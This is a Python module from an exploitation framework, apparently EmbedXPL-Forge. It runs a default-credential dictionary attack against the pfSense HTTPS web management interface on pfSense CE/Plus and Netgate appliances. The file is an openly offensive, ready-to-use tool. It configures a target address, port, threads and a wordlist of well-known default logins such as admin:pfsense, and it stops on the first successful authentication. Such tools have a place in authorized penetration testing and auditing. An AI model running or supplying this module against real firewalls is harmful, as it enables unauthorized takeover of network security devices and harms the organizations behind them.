# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.http_multi_auth_default import Exploit as HTTPDefault


class Exploit(HTTPDefault):
    """pfSense Web Interface Default Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "pfSense Web Interface Default Credentials",
        "description": (
            "Dictionary attack with default credentials against the pfSense HTTPS "
            "web management interface. Default admin:pfsense is well-known. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "pfSense CE / pfSense Plus (all versions)",
            "Netgate appliances SG-1100 through SG-8200",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "HTTPS management port")
    ssl = OptBool(True, "Use SSL/TLS")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "admin:pfsense,admin:admin,admin:password",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
